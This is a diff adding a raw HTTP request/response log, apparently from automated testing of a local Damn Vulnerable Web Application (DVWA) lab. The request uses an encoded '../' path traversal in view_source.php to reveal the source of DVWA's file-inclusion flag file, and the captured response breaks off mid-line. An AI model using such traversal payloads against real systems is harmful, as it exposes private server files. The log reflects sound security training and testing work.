@@ -1,0 +1,69 @@
+# 2026-11-16T12:31:03.693178+00:00  target=http://127.0.0.1:4281
+> GET http://127.0.0.1:4281/vulnerabilities/view_source.php?id=fi&security=..%2F..%2F..%2Fhackable%2Fflags%2Ffi
+> User-Agent: python-requests/2.34.2
+> Accept-Encoding: gzip, deflate
+> Accept: */*
+> Connection: keep-alive
+>
+
+
+< HTTP 200
+< Server: nginx/1.27.5
+< Date: Mon, 16 Nov 2026 12:31:03 GMT
+< Content-Type: text/html;charset=utf-8
+< Content-Length: 1078
+< Connection: keep-alive
+< X-Powered-By: PHP/8.5.12
+< Expires: Tue, 23 Jun 2009 12:00:00 GMT
+< Cache-Control: no-cache, must-revalidate
+< Pragma: no-cache
+< Vary: Accept-Encoding
+< Content-Encoding: gzip
+<
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Damn Vulnerable Web Application (DVWA)Source :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../dvwa/css/source.css" />
+
+		<link rel="icon" type="\image/ico" href="../favicon.ico" />
+
+	</head>
+
+	<body class="light">
+
+		<div id="container">
+
+			
+	<div class="body_padded">
+		<h1>File Inclusion Source</h1>
+
+		<h2>vulnerabilities/fi/source/../../../hackable/flags/fi.php</h2>
+		<div id="code">
+			<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
+				<tr>
+					<td><div id="code"><pre><code style="color: #000000"><span style="color: #0000BB">&lt;?php
+
+</span><span style="color: #007700">if( !</span><span style="color: #0000BB">defined</span><span style="color: #007700">( </span><span style="color: #DD0000">'DVWA_WEB_PAGE_TO_ROOT' </span><span style="color: #007700">) ) {
+    exit (</span><span style="color: #DD0000">"Nice try ;-). Use the file include next time!"</span><span style="color: #007700">);
+}
+
+</span><span style="color: #0000BB">?&gt;
+</span>
+1.) Bond. James Bond
+
+<span style="color: #0000BB">&lt;?php
+
+</span><span style="color: #007700">echo </span><span style="color: #DD0000">"2.) My name is Sherlock Holmes. It is my business to know what other people don't know.\n\n&lt;br /&gt;&lt;br /&gt;\n"</span><span style="color: #007700">;
+
+</span><span style="color: #0000BB">$line3 </span><span style="color: #007700">= </span><span style="color: #DD0000">"3.) Romeo, Romeo! Wherefore art thou Romeo?"</span><span style="color: #007700">;
+</span><span style="color: #0000BB">$line3 </span><span style="color: #007700">= </span><span style="color: #DD0000">"--LINE HIDDEN ;)--"</span><span style="color: #007700">;
+echo </span><span style="color: #0000BB">$line3 </span><span style="color: #007700">. </span><span style="color: #DD0000">"\n\n&lt;br /&gt;&lt;br /&gt;\n"</span><span style="color: #007700">;
+
+</span><span style="color: #0000BB">$line4 </span><span style="color: #007700">= </span><span style="color: #DD0000">"NC4pI" </span><span style="color: #007700">. </span><span style="color: #DD0000">"FRoZSBwb29s" </span><span style="color: #007700">. </span><span style="color: #DD0000">"IG9uIH" </span><span style="color: #007700">. </span><span style="color: #DD0000">"RoZSByb29mIG1" </span><span style="color: #007700">. </span><span style="color: #DD0000">"1c3QgaGF" </span
